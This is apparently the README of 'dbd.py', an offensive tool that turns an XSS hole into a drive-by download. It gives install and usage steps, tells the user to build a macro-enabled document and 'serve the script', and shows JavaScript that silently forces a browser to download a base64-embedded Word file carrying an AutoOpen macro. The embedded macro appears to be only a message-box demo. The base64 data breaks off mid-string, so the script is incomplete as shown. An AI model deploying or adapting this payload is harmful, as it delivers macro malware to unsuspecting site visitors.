# dbd.py (drive-by-download)

Generate a post exploit script to download an arbitrary file using HTML5's Blob object (https://developer.mozilla.org/en-US/docs/Web/API/Blob). Use this to demonstrate *meaningful* XSS attack vectors instead of ```alert(1)```.

# install

```shell
$ git clone https://github.com/demetriusx00/dbd.git
$ cd dbd/ && pip3 install -r requirements.txt
```

# usage

```bash
Usage: dbd.py [OPTIONS]

  Generate a drive-by-download XSS payload.

Options:
  --suffix [.doc|.pdf|.docx]
  --payload FILE
  --help                      Show this message and exit.
```

Create a macro-enabled document, then run:

```bash
$ python3 dbd.py --suffix=".doc" --payload="15122020.doc"
```

Serve the script with tooling of your choice :smiling_imp:


```javascript
((file, payload) => {
  const empty = ({
    length
  }) => length === 0;

  if (empty(file) || empty(payload)) return;

  const decoded = window.atob(payload);
  const size = payload.length;
  const a = document.createElement('a');

  const bin = new Uint8Array(size);
  for (let i = 0; i < size; i++) {
    bin[i] = decoded.charCodeAt(i);
  }

  const blob = new Blob([bin.buffer]
    , {
      type: 'octet/stream'
    });

  const url = window.URL.createObjectURL(blob);

  a.style = 'display:none;';
  a.href = url;
  a.download = file;

  document.body.appendChild(a);
  a.click();

  window.URL.revokeObjectURL(url);
  document.body.removeChild(a);

})('60a8e3b.doc', '0M8R4KGxGuEAAAAAAAAAAAAAAAAAAAAAOwADAP7/CQAGAAAAAAAAAAAAAAABAAAAKQAAAAAAAAAAEAAAAgAAAAIAAAD+////AAAAAAAAAAD////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////9////HAAAABAAAAAEAAAABQAAAAYAAAAHAAAACAAAAAkAAAAKAAAACwAAAAwAAAANAAAADgAAAA8AAAARAAAA/v///xIAAAATAAAAFAAAABUAAAAWAAAAFwAAAAEAAAD/////////////////////HQAAAB4AAAAfAAAA/v///yEAAAAiAAAAIwAAACQAAAAlAAAAJgAAACcAAAAoAAAA/v///yoAAAArAAAALAAAAC0AAAD+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////2hgXlwAZkgAAnHKCgAAAP/h390AAABGAP4fAQBCAUYAAAAHAEgAZQBhAGQAaQBuAGcAAAANABMAE6TwABSkeAAGJAEAGABPSgcAUUoHAENKHABQSggAXkoJAGFKHAA0AEIQAQBCATQAAAAJAFQAZQB4AHQAIABCAG8AZAB5AAAAEAAUABJkFAEBABOkAAAUpIwAAAAgAC8QQQFSASAAAAAEAEwAaQBzAHQAAAACABUABABeSgkAQAAiEAEAYgFAAAAABwBDAGEAcAB0AGkAbwBuAAAADQAWABOkeAAUpHgADCQBABIAQ0oYADYIAV5KCQBhShgAXQgBJgD+HwEAcgEmAAAABQBJAG4AZABlAHgAAAAFABcADCQBAAQAXkoJAAAAAAAyAQAABAAAEAAAAAD/////AAgAAGQKAAAGAAAAAAgAAGQKAAAHAAAA/wEBAAAAVgAAAAAA//8uEAAAAAAAAAsAAAAuDgAAEP//AQACABoAUAByAG8AagBlAGMAdAAuAE4AZQB3AE0AYQBjAHIAbwBzAC4AQQB1AHQAbwBPAHAAZQBuAAEAEQEAAAAaAFAAUgBPAEoARQBDAFQALgBOAEUAVwBNAEEAQwBSAE8AUwAuAEEAVQBUAE8ATwBQAEUATgAAAEAAAAAAMgEAAAAAAAACEAAAAAAAAAAyAQAAAQAAAAIAAAADAAAABAAAAAUAAAAGAAAA/v///wgAAAD+////CgAAAAsAAAAMAAAADQAAAA4AAAAPAAAAEAAAABEAAAASAAAAEwAAABQAAAD+////FgAAABcAAAAYAAAAGQAAABoAAAAbAAAAHAAAAB0AAAAeAAAAHwAAACAAAAAhAAAAIgAAACMAAAAkAAAAJQAAACYAAAAnAAAAKAAAACkAAAAqAAAAKwAAAP7///8tAAAA/v///y8AAAAwAAAAMQAAADIAAAAzAAAANAAAAP7///82AAAANwAAAP7///85AAAAOgAAADsAAAA8AAAAPQAAAD4AAAA/AAAAQAAAAEEAAABCAAAA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AAAAAAAAAACwAAAAAAAAAAAAAAABAAAAAgAEAAAAAAAAA0zQ+C36WxsQveUAqgBE3lICAAAAAAAAAgYAAAAAAAAAT2ZmaWNlEAAAAAAAAAoxBQAAAAAAAAAAAAD//////////wIACAAAAAAA4QEAAAAAAAAAAAAAYQUAAAAAAAAAAAAA0AAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAIIAAAAAAAAAEF1dG9PcGVuBgAAAAAAAA0UABQAAAAQAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAsAAAAABgAAAAAAAAsMAAAAQQBwAFAAUwBlAEMADgAAAAAAAAf/////////////////////UwILAGEHAAAAAAAAAAAAACABAAAAAAAAAAAAACQAAAAAAAAOAgVyAAIIAggICN4CAAAAAAB/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHJV+AEAAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAABIAAAAAAAAAEQAAAAAAAAAAAAAA//////////////////////////8AAAAA//////////8RAAAAAAAAAAAAAwDaAwAAAAAAfwAAAAAAAAAAAAAAAAAAclX4AQAAAAAAAEAAAAAAAAAAQAAAAAAAAABAAAAAAAAAAAQAAAAAAAB+eAAAAAAAAH8AAAAAAAAAABoAAAAAAAAAEQAAAAAAAAAAAAAAEQAAAAAAAAAAAAMAEAAAAAAAAAAAAAIAAQABAAMAAADhBgAAAAAAAAAAAAChBgAAAAAAAAAAAACBBgAAAAAAAAAAAADaAAAAAAAAAHAAAAAAAAAAZwIGAAAAZwJgAAAA8QFA////8QFw////ngW4////AQDrBaD///+fAqD///+QBQAAAACeBej///8CAOsF0P///58C0P///7IEAAAoALICPP///4oFCADQ////oP///3D///9A////ZwIAAAAAewLwPwAAAAAAAAAACADIAHAAAAA4AAAACAAAAAAAAAAAAAAAAAAAABQAAAAAAAAAAAAAAAAAAAAAAAAAMgAAAAAAAAAAAAQAAAAAAAAAAADQ////AgAAAKD///8CAAAAcP///wIAAABA////AgAMAAAAAAAAEgAAYQEAAAAAAAAAAAIAIgAAAAAAAA4AAGsAFKADAAAAAAB/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHJV+AEAAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAABoAAAAAAAAAEQAAAAAAAAAAAAIA////////////////AAAAABAAAAAIADgA8QAAAAAAAAAAAAIAAAAAYAAA/f////////////////////////8AAAAAAAAAAAAAAAAAAAAA0gMAAAAAAH8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEWAwAG9AAAAM4EAADYAAAAtAEAAP////8PBQAA1wUAAJEGAAAAAAAAAQAAAHJrhc0AAP//AwAAAAAAAAC2AP//AQEAAAAA/////wAAAAD//wgA//8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAwAAAAUAAAAHAAAA//////////8BAQgAAAD/////eAAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP//AAAAAE1FAAD///////8AAAAA//8AAAAA//8BAQAAAADfAP//AAAAABAA//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////8oAAAAAAA2Cv////8AAAAAGgj/////AAAAAAI8GAD//wAAAAACPP////8AAP//AQEAAAAAAAABAAAAAABQAgAAAQGIAgAA/////0AAAAACgzAC/////wAAAAD/////OAAAAAAA////////AAAAAP//////////AAByZEludGUdAAAAJQAAAAsSMgL/////AAAAYAAAAAD//////////wAAAAAAAAAAAAAAAAAAAADYAAAAPP///2sAAAAAAAAA/////////////wAAAwADAAAAhAAAAwAA/////2gBAAD/////0AEAAP/////YAQAA//////ABAAD/////yAQAAP////8gAgAA/////zgCAAD/////UAIAAP////9AAAAA/////////////////////////////////////////////////////////////////////////////////////////////////////6gBAAD/////kAEAAP////9oAgAA//////////////////////////////////////////////////////////////////////////94AQAA//////////80AgAALgBTAAEAcwD/////AQAAAEAE/v/AAQAA6P////////8MAP//IAAAAEAE/v/YAQAA0P////////8MAP//IAAAAEAE/v/wAQAAuP////////8MAP//IAAAAEAE/v8IAgAAoP////////8MAP//IAAAAEAE/v8gAgAAiP////////8MAP//IAAAAEAE/v84AgAAcP////////8MAP//IAAAAEAE/v//////WP////////8MAP//IAAAAEAE/v//////QP////////8MAP//IAAAAP////8IAAAAAwD//yAAAAD/////2AAAAEAE/v//////PP////////8DAP//IAAAAP////9IAgAAAQABAAAAAAAAAAAAAAAAAEAAAAD//////////////////////////0AAAAD/////////////////////////////////////CAAAAAAAAAAAAAAAEAAAAAgA/////wAAAAD///////////////////////////////8AAAIA0AAAAH83KWAHAAEkACoAXABSAGYAZgBmAGYAKgAwAEEANgAwADIAOQAzADcANwBmAAEQACoAXABSADAAKgAjADEANwDfAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/soBAAMAIoEIAAYABgAAAAAAAIEIABgAYAA4AAAABIEIAAIACAAIAAAA/////wEBWAAAAJYEQAAAAAAAbwAAAAAAAAD/////SAAAAP////8wAAAA/////0AAAAD/////MAAAAP/////oAAAAuQAAAKwAAAC5AAYAQXBQU2VDQUA0AgMA/////1gAAAD/////AQEwAAAAAAAAYAABAAD/////ABQAcAAAAAACAQAAAAAAAAUCCAIICAit/38AAP////9QAAAAEAAAAP//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////AAABVrAAQXR0cmlidXQAZSBWQl9OYW0AZSA9ICJOZXcATWFjcm9zIgoAU3ViIEF1dG8AT3BlbigpCk0Ac2dCb3ggIiIALCAwLCAiQXAAUFNlQyIKRW4EZCAAUgoAAAAAAAAAAAAAAAAAAAABFgMAAfQAAADIAgAA2AAAAN4BAAD/////zwIAACMDAAC1AwAAAAAAAAEAAABya139AAD//6MBAACIAAAAtgD//wEBAAAAAP////8AAAAA////////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAMAAAAFAAAABwAAAP//////////AQEIAAAA/////3gAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD//wAAAABNRQAA////////AAAAAP//AAAAAP//AQEAAAAA3wD//wAAAAAYAP//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////KAAAAAIAUyL/////AAABAFMQ/////wAAAQBTIv////8AAAAAAjz/////AAD//wEBAAAAAAEAKAAxAE4AbwByAG0AYQBsAC4AVABoAGkAcwBEAG8AYwB1AG0AZQBuAHQACAAAAAAA/////wEBWAAAAAKA/v//////IAAAAP////8wAAAAAgH//wAAAAAAAAAA//////////8AAFgAAQAAjB0AAAAlAAAA/////0AAAAD/////OAAAAP////9AAAAA/////zgAAAAAAAAAAAABAAAAAAAAAAAA////////////////AAAAAP//////////////////////////AAAAAP//////////////////////////AAAAAAAAAAD//wAA////////AAAAAP///////////////////////////////wAAAQBIAAAAfzcpYAcA3wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP7KAQAAAP////8BAQgAAAD/////eAAAAP////8BAQgAAAD/////eAAAAP///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////wAAAZiwAEF0dHJpYnV0AGUgVkJfTmFtAGUgPSAiVGhpAHNEb2N1bWVuiHQiCgqIQmFzAogAMU5vcm1hbC6BGKhHbG9iYWwBphBTcGFjAWpGYWwEc2ULnkNyZWF0CGFibBQeUHJlZJBlY2xhAAZJZACaCFRydQxARXhwbwRzZRMbVGVtcGwAYXRlRGVyaXYBFCNDdXN0b21pBnqEQQIwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADMYdwAAAMA/wkEAAAJBAAAECcDAAAAAAAAAAAAAQAFAAIAPgEqAFwASAB7ADAAMAAwADIAMAA0AEUARgAtADAAMAAwADAALQAwADAAMAAwAC0AQwAwADAAMAAtADAAMAAwADAAMAAwADAAMAAwADAANAA2AH0AIwA2AC4AMAAjAIEAAACCAAAAgwAAAIQAAACFAAAAhgAAAIcAAACIAAAAiQAAAIoAAACLAAAAjAAAAI0AAACOAAAAjwAAAJAAAACRAAAAkgAAAJMAAACUAAAAlQAAAJYAAACXAAAAmAAAAP7////+////mwAAAJwAAACdAAAAngAAAJ8AAACgAAAAoQAAAKIAAACjAAAApAAAAKUAAACmAAAApwAAAKgAAACpAAAAqgAAAKsAAACsAAAArQAAAK4AAACvAAAAsAAAALEAAACyAAAAswAAALQAAAC1AAAAtgAAALcAAAC4AAAAuQAAALoAAAC7AAAAvAAAAL0AAAC+AAAA/v///8AAAAD+////wgAAAMMAAADEAAAA/v///8YAAAD+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////OQAjAC8AQQBwAHAAbABpAGMAYQB0AGkAbwBuAHMALwBNAGkAYwByAG8AcwBvAGYAdAAgAFcAbwByAGQALgBhAHAAcAAvAEMAbwBuAHQAZQBuAHQAcwAvAFMAaABhAHIAZQBkAFMAdQBwAHAAbwByAHQALwBUAHkAcABlACAATABpAGIAcgBhAHIAaQBlAHMALwBWAGIAZQBFAE4ANgAuAHQAbABiACMAVgBpAHMAdQBhAGwAIABCAGEAcwBpAGMAIABGAG8AcgAgAEEAcABwAGwAaQBjAGEAdABpAG8AbgBzAAAAAAAAAAAAAAAAAFgBKgBcAEgAewAwADAAMAAyADAAOQAwADUALQAwADAAMAAwAC0AMAAwADAAMAAtAEMAMAAwADAALQAwADAAMAAwADAAMAAwADAAMAAwADQANgB9ACMAOAAuADcAIwAwACMALwBBAHAAcABsAGkAYwBhAHQAaQBvAG4AcwAvAE0AaQBjAHIAbwBzAG8AZgB0ACAAVwBvAHIAZAAuAGEAcABwAC8AQwBvAG4AdABlAG4AdABzAC8AUwBoAGEAcgBlAGQAUwB1AHAAcABvAHIAdAAvAFQAeQBwAGUAIABMAGkAYgByAGEAcgBpAGUAcwAvAE0AaQBjAHIAbwBzAG8AZgB0ACAAVwBvAHIAZAAuAHQAbABiACMATQBpAGMAcgBvAHMAbwBmAHQAIABXAG8AcgBkACAAMQA2AC4AMAAgAE8AYgBqAGUAYwB0ACAATABpAGIAcgBhAHIAeQAAAAAAAAAAAAAAAABEASoAXABIAHsAMABEADQANQAyAEUARQAxAC0ARQAwADgARgAtADEAMAAxAEEALQA4ADUAMgBFAC0AMAAyADYAMAA4AEMANABEADAAQgBCADQAfQAjADIALgAwACMAMAAjAC8AQQBwAHAAbABpAGMAYQB0AGkAbwBuAHMALwBNAGkAYwByAG8AcwBvAGYAdAAgAFcAbwByAGQALgBhAHAAcAAvAEMAbwBuAHQAZQBuAHQAcwAvAFMAaABhAHIAZQBkAFMAdQBwAHAAbwByAHQALwBUAHkAcABlACAATABpAGIAcgBhAHIAaQBlAHMALwBmAG0AMgAwAC4AdABsAGIAIwBNAGkAYwByAG8AcwBvAGYAdAAgAEYAbwByAG0AcwAgADIALgAwACAATwBiAGoAZQBjAHQAIABMAGkAYgByAGEAcgB5AAAAAAAAAAAAAAABAFoBKgBcAEgAewAyADAANgBBADAAMwBBADMALQA2AEMANAA5AC0ARgA3ADQAMgAtADkAOQBBADcALQBGADYARAAxADYAQwAwADkAQQBGADgAOQB9ACMAMgAuADAAIwAwACMALwBVAHMAZQByAHMALwBkAGYAMAA2ADYAMQA5ADkALwBMAGkAYgByAGEAcgB5AC8AQwBvAG4AdABhAGkAbgBlAHIAcwAvAGMAbwBtAC4AbQBpAGMAcgBvAHMAbwBmAHQALgBXAG8AcgBkAC8ARABhAHQAYQAvAEwAaQBiAHIAYQByAHkALwBQAHIAZQBmAGUAcgBlAG4AYwBlAHMALwBNAFMARgBvAHIAbQBzAC4AZQB4AGQAIwBNAGkAYwByAG8AcwBvAGYAdAAgAEYAbwByAG0AcwAgADIALgAwACAATwBiAGoAZQBjAHQAIABMAGkAYgByAGEAcgB5AAAAAAAAAAAAAAABAAAA4S5FDY/gGhCFLgJgjE0LtAAAEgAqAFwARABOAG8AcgBtAGEAbAASACoAXABEAE4AbwByAG0AYQBsAFWnI2ABAAAAAAAAAEYBKgBcAEgAewAyAEQARgA4AEQAMAA0AEMALQA1AEIARgBBAC0AMQAwADEAQgAtAEIARABFADUALQAwADAAQQBBADAAMAA0ADQARABFADUAMgB9ACMAMgAuADgAIwAwACMALwBBAHAAcABsAGkAYwBhAHQAaQBvAG4AcwAvAE0AaQBjAHIAbwBzAG8AZgB0ACAAVwBvAHIAZAAuAGEAcABwAC8AQwBvAG4AdABlAG4AdABzAC8AUwBoAGEAcgBlAGQAUwB1AHAAcABvAHIAdAAvAFQAeQBwAGUAIABMAGkAYgByAGEAcgBpAGUAcwAvAG0AcwBvAC4AdABsAGIAIwBNAGkAYwByAG8AcwBvAGYAdAAgAE8AZgBmAGkAYwBlACAAMQA2AC4AMAAgAE8AYgBqAGUAYwB0ACAATABpAGIAcgBhAHIAeQAAAAAAAAAAAAAAAAACAAIAAQAHABICAAAUAgAAFgIBABgCAQAaAgEAHAIBAB4CEAAkAv///////wAAAAAAAAAAfzcpYAcA//////////////////8AAP////8BAP///////////////////////////////////////////////////////wEAAAAAAAAAAAAAAAAAAAAAAAAAcmsCABgAVABoAGkAcwBEAG8AYwB1AG0AZQBuAHQAFAAwAD4ANgAwADIAOQAzADcANwBmAP//JwIYAFQAaABpAHMARABvAGMAdQBtAGUAbgB0AP//Xf0AAAAAAAAAAgAAALsDAAD//xIATgBlAHcATQBhAGMAcgBvAHMAFAAwAEEANgAwADIAOQAzADcANwBmAP//MAISAE4AZQB3AE0AYQBjAHIAbwBzAP//hc0AAAAAAAAYAgAAAJcGAAD///////8BATgCAAD///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////8AAgAA//////////////////////////8YAgAA/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////ym/RZbhv0LkrCOlnTY6OB//////AQAAAF9FhaqX7k0pq5Wf6KA52oj/////AQAAAP////9IAAAAgAAAAAAAHAEWAAYBCC0AAAQMV29yZLVrEAADDFZCQffiEAAFBFdpbjE2wX4QAAUEV2luMzIHfxAABQRXaW42NHh/EAADBE1hY7OyEAAEBFZCQTatIxAABARWQkE3riMQABIETUFDX09GRklDRV9WRVJTSU9OSEcQAAgEUHJvamVjdDEKFxAABwhNU0Zvcm1zQw8QAAcMUHJvamVjdC2uEAAMDFRoaXNEb2N1bWVudDyeEAAJgAAA/wMDAF9FdmFsdWF0ZRjZEAAGCE5vcm1hbN/YEAAGjCgA/wMDAE9mZmljZRV1EAAHBE1vZHVsZTFiERAACQxOZXdNYWNyb3OuahAACKwoAQEAAwBBdXRvT3BlbtkqEAAGAE1zZ0JveJdSEAAIhAgA/wMBAERvY3VtZW50atMQAAmAAAD/AwMAU3ViTXNnQm9409AQAAL//wEBYAAAAP///////yICAgD//yQC/////ycCAAADAP///////yoCAwD//ywCBAD//w4CAQD//xACAAD//zECAQADAP///////////////////////////////////////////////wkAEAAAAAEAJAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAgAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAASABgACgABAFsADwAAAAAAAAAAAFoAABDx/wIAWgAAAAYATgBvAHIAbQBhAGwAAAALAAAAMSQBKiQBQSQAAC8AQioAT0oGAFFKBgBDShgAbUgJBHNICQRQSgYAbkgECHRIBAheSgYAYUoYAF9IAQQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADwA/h/y//EAPAAAABYARABlAGYAYQB1AGwAdAAgAFAAYQByAGEAZwByAGEAcABoACAARgBvAG4AdAAAAAAAQgD+H/L/AQFCAAAAGQBXAFcALQBEAGUAZgBhAHUAbAB0ACAAUABhAHIAYQBnAHIAYQBwAGgAIABGAG8AbgB0AAAAAAA2AFUQ8v8RATYAAAANAEkAbgB0AGUAcgBuAGUAdAAgAEwAaQBuAGsAAAAMAEIqAnBoAAD/AD4qAU4A/h/y/yEBTgAAABIAVQBuAHIAZQBzAG8AbAB2AGUAZAAgAE0AZQBuAHQAaQBvAG4AAAAaAEIqD3BSAG8AbwB0ACAARQBuAHQAcgB5AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFgAFAP//////////AQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAAABAJgAAAAAAAE0AYQBjAHIAbwBzAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOAAEA//////////8CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/v///wAAAAAAAAAAVgBCAEEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAQD/////AwAAAAUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD+////AAAAAAAAAABQAFIATwBKAEUAQwBUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAACAP////8EAAAA/////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACnAQAAAAAAAFAAUgBPAEoARQBDAFQAdwBtAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUAAIA////////////////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABwAAAEcAAAAAAAAAZABpAHIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAgD////